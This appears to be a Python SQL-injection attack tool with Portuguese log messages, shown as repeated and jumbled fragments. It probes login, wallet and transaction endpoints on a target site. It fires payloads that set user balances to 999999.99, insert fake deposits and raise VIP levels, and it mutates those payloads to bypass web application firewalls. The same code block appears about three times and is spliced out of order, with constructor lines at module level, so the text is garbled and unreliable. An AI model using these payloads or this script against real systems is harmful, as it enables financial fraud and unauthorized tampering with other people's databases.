                                "response_code": response_get.status_code,
                                "method": "GET"
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção GET bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                    except Exception as e:
                        logger.error(f"Erro na injeção {mutated} em {url}: {e}", exc_info=True)

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return
        vulnerable = self.detect_vulnerable_fields(base_url)
        if not vulnerable:
            logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
            return
        for url in vulnerable:
            campos = self.analyze_endpoint(url)
            self.smart_injection_attempts(url, campos)
        if self.successful_injections:
            report = {
                "target": base_url,
                "vulnerable_endpoints": vulnerable,
                "successful_injections": self.successful_injections,
                "total_success": len(self.successful_injections)
            }
            save_to_output("sql_injection_report.json", json.dumps(report, indent=2))
            logger.info(f"📊 Relatório gerado com {len(self.successful_injections)} injeções bem sucedidas")

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()
    self.session = httpx.Client(
        proxies=self.config.get("proxy", None),
        verify=False,
        timeout=15,
        headers={"User-Agent": "EVIL_JWT_FORCE/2.0"}
    )
    self.balance_payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
        "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
        "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
        "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
        "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
        "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
        "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
        "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --",
        "\" OR \"1\"=\"1\"--",
        "' OR sleep(5)--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;--",
        "' OR 1=1;#",
        "' OR 1=1;/*",
        "' OR 1=1; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1; WAITFOR DELAY '00:00:05'--"
    ]
    self.waf_bypass_payloads = [
        "'/*!50000union*/ /*!50000select*/ 1,2,3--",
        "' OR 1=1-- -",
        "' OR 1=1--+",
        "' OR 1=1--%0A",
        "' OR 1=1--%23",
        "' OR 1=1--%3B",
        "' OR 1=1--%2D%2D",
        "' OR 1=1--%23",
        "' OR 1=1--%0A",
        "' OR 1=1--%0D%0A"
    ]
    self.vulnerable_endpoints = []
    self.successful_injections = []
    self.detected_waf = False

    def detect_waf(self, url: str) -> bool:
        try:
            resp = self.session.get(url)
            waf_signatures = [
                "access denied", "forbidden", "blocked", "waf", "web application firewall",
                "mod_security", "cloudflare", "incapsula", "sucuri", "request rejected"
            ]
            if any(sig in resp.text.lower() for sig in waf_signatures):
                logger.warning(f"[WAF DETECTADO] {url}")
                self.detected_waf = True
                return True
        except Exception as e:
            logger.error(f"Erro ao detectar WAF em {url}: {e}")
        return False

    def mutate_payload(self, payload: str) -> List[str]:
        mutations = [
            payload,
            payload.replace(" ", "/**/"),
            payload.replace("'", "\""),
            payload.replace("1=1", "1=1--"),
            payload.replace("OR", "oR"),
            payload.replace("OR", "||"),
            payload.replace("--", "#"),
            payload + "--",
            payload + "#",
            payload + "/*",
            payload.upper(),
            payload.lower()
        ]
        return list(set(mutations))

    def detect_vulnerable_fields(self, base_url: str) -> List[str]:
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        endpoints = [
            "/admin/login", "/api/auth/login", "/api/user/profile", "/api/user/balance",
            "/api/wallet/update", "/api/transactions", "/api/user/bonus", "/api/user/wallet",
            "/api/user/privilege", "/api/crypto/decrypt", "/api/crypto/aes/validate"
        ]
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            self.detect_waf(full_url)
            try:
                test_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "admin' --", "admin\" --"]
                for test_payload in test_payloads:
                    response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
                    if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql", "error", "exception"]):
                        self.vulnerable_endpoints.append(full_url)
                        logger.info(f"[VULNERÁVEL] {full_url}")
                        break
            except Exception as e:
                logger.error(f"Erro ao testar endpoint {full_url}: {e}")
        return self.vulnerable_endpoints

    def analyze_endpoint(self, url: str) -> List[str]:
        try:
            resp = self.session.get(url)
            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
            campos_unicos = list(set(campos))
            logger.info(f"Campos identificados em {url}: {campos_unicos}")
            return campos_unicos
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {url}: {e}")
            return []

    def smart_injection_attempts(self, url: str, campos: List[str]):
        all_payloads = self.balance_payloads + self.waf_bypass_payloads
        for payload in all_payloads:
            for mutated in self.mutate_payload(payload):
                data_variants = []
                for campo in campos:
                    data = {campo: mutated}
                    data_variants.append(data)
                data_variants.extend([
                    {"username": mutated, "password": "test"},
                    {"user": mutated, "pass": "test"},
                    {"token": mutated},
                    {"auth": mutated},
                    {"balance": mutated}
                ])
                for data in data_variants:
                    try:
                        # Testa POST e GET para maximizar chances
                        response = self.session.post(url, data=data)
                        success_markers = [
                            "success", "balance updated", "transaction complete",
                            "200 OK", "changes saved", "account modified", "saldo", "atualizado"
                        ]
                        if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response.status_code
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                        # Testa GET também
                        response_get = self.session.get(url, params=data)
                        if response_get.status_code == 200 or any(marker in response_get.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response_get.status_code,
                                "method": "GET"
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção GET bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                    except Exception as e:
                        logger.error(f"Erro na injeção {mutated} em {url}: {e}", exc_info=True)

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return
        vulnerable = self.detect_vulnerable_fields(base_url)
        if not vulnerable:
            logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
            return
        for url in vulnerable:
            campos = self.analyze_endpoint(url)
            self.smart_injection_attempts(url, campos)
        if self.successful_injections:
            report = {
                "target": base_url,
                "vulnerable_endpoints": vulnerable,
                "successful_injections": self.successful_injections,
                "total_success": len(self.successful_injections)
            }
            save_to_output("sql_injection_report.json", json.dumps(report, indent=2))
            logger.info(f"📊 Relatório gerado com {len(self.successful_injections)} injeções bem sucedidas")

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()
    self.session = httpx.Client(
        proxies=self.config.get("proxy", None),
        verify=False,
        timeout=15,
        headers={"User-Agent": "EVIL_JWT_FORCE/2.0"}
    )
    self.balance_payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
        "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
        "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
        "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
        "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
        "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
        "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
        "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --",
        "\" OR \"1\"=\"1\"--",
        "' OR sleep(5)--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;--",
        "' OR 1=1;#",
        "' OR 1=1;/*",
        "' OR 1=1; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1; WAITFOR DELAY '00:00:05'--"
    ]
    self.waf_bypass_payloads = [
        "'/*!50000union*/ /*!50000select*/ 1,2,3--",
        "' OR 1=1-- -",
        "' OR 1=1--+",
        "' OR 1=1--%0A",
        "' OR 1=1--%23",
        "' OR 1=1--%3B",
        "' OR 1=1--%2D%2D",
        "' OR 1=1--%23",
        "' OR 1=1--%0A",
        "' OR 1=1--%0D%0A"
    ]
    self.vulnerable_endpoints = []
    self.successful_injections = []
    self.detected_waf = False

    def detect_waf(self, url: str) -> bool:
        try:
            resp = self.session.get(url)
            waf_signatures = [
                "access denied", "forbidden", "blocked", "waf", "web application firewall",
                "mod_security", "cloudflare", "incapsula", "sucuri", "request rejected"
            ]
            if any(sig in resp.text.lower() for sig in waf_signatures):
                logger.warning(f"[WAF DETECTADO] {url}")
                self.detected_waf = True
                return True
        except Exception as e:
            logger.error(f"Erro ao detectar WAF em {url}: {e}")
        return False

    def mutate_payload(self, payload: str) -> List[str]:
        mutations = [
            payload,
            payload.replace(" ", "/**/"),
            payload.replace("'", "\""),
            payload.replace("1=1", "1=1--"),
            payload.replace("OR", "oR"),
            payload.replace("OR", "||"),
            payload.replace("--", "#"),
            payload + "--",
            payload + "#",
            payload + "/*",
            payload.upper(),
            payload.lower()
        ]
        return list(set(mutations))

    def detect_vulnerable_fields(self, base_url: str) -> List[str]:
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        endpoints = [
            "/admin/login", "/api/auth/login", "/api/user/profile", "/api/user/balance",
            "/api/wallet/update", "/api/transactions", "/api/user/bonus", "/api/user/wallet",
            "/api/user/privilege", "/api/crypto/decrypt", "/api/crypto/aes/validate"
        ]
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            self.detect_waf(full_url)
            try:
                test_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "admin' --", "admin\" --"]
                for test_payload in test_payloads:
                    response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
                    if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql", "error", "exception"]):
                        self.vulnerable_endpoints.append(full_url)
                        logger.info(f"[VULNERÁVEL] {full_url}")
                        break
            except Exception as e:
                logger.error(f"Erro ao testar endpoint {full_url}: {e}")
        return self.vulnerable_endpoints

    def analyze_endpoint(self, url: str) -> List[str]:
        try:
            resp = self.session.get(url)
            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
            campos_unicos = list(set(campos))
            logger.info(f"Campos identificados em {url}: {campos_unicos}")
            return campos_unicos
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {url}: {e}")
            return []

    def smart_injection_attempts(self, url: str, campos: List[str]):
        all_payloads = self.balance_payloads + self.waf_bypass_payloads
        for payload in all_payloads:
            for mutated in self.mutate_payload(payload):
                data_variants = []
                for campo in campos:
                    data = {campo: mutated}
                    data_variants.append(data)
                data_variants.extend([
                    {"username": mutated, "password": "test"},
                    {"user": mutated, "pass": "test"},
                    {"token": mutated},
                    {"auth": mutated},
                    {"balance": mutated}
                ])
                for data in data_variants:
                    try:
                        # Testa POST e GET para maximizar chances
                        response = self.session.post(url, data=data)
                        success_markers = [
                            "success", "balance updated", "transaction complete",
                            "200 OK", "changes saved", "account modified", "saldo", "atualizado"
                        ]
                        if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response.status_code
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                        # Testa GET também
                        response_get = self.session.get(url, params=data)
                        if response_get.status_code == 200 or any(marker in response_get.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response_get.status_code,
                                "method": "GET"
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção GET bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                    except Exception as e:
                        logger.error(f"Erro na injeção {mutated} em {url}: {e}", exc_info=True)

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return
        vulnerable = self.detect_vulnerable_fields(base_url)
        if not vulnerable:
            logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
            return
        for url in vulnerable:
            campos = self.analyze_endpoint(url)
            self.smart_injection_attempts(url, campos)
        if self.successful_injections:
            report = {
                "target": base_url,
                "vulnerable_endpoints": vulnerable,
                "successful_injections": self.successful_injections,
                "total_success": len(self.successful_injections)
            }
            save_to_output("sql_injection_report.json", json.dumps(report, indent=2))
            logger.info(f"📊 Relatório gerado com {len(self.successful_injections)} injeções bem sucedidas")

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()
    self.session = httpx.Client(
        proxies=self.config.get("proxy", None),
        verify=False,
        timeout=15,
        headers={"User-Agent": "EVIL_JWT_FORCE/2.0"}
    )
    self.balance_payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
        "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
        "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
        "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
        "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
        "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
        "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
        "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --",
        "\" OR \"1\"=\"1\"--",
        "' OR sleep(5)--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;--",
        "' OR 1=1;#",
        "' OR 1=1;/*",
        "' OR 1=1; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1; WAITFOR DELAY '00:00:05'--"
    ]
    self.waf_bypass_payloads = [
        "'/*!50000union*/ /*!50000select*/ 1,2,3--",
        "' OR 1=1-- -",
        "' OR 1=1--+",
        "' OR 1=1--%0A",
        "' OR 1=1--%23",
        "' OR 1=1--%3B",
        "' OR 1=1--%2D%2D",
        "' OR 1=1--%23",
        "' OR 1=1--%0A",
        "' OR 1=1--%0D%0A"
    ]
    self.vulnerable_endpoints = []
    self.successful_injections = []
    self.detected_waf = False

    def detect_waf(self, url: str) -> bool:
        try:
            resp = self.session.get(url)
            waf_signatures = [
                "access denied", "forbidden", "blocked", "waf", "web application firewall",
                "mod_security", "cloudflare", "incapsula", "sucuri", "request rejected"
            ]
            if any(sig in resp.text.lower() for sig in waf_signatures):
                logger.warning(f"[WAF DETECTADO] {url}")
                self.detected_waf = True
                return True
        except Exception as e:
            logger.error(f"Erro ao detectar WAF em {url}: {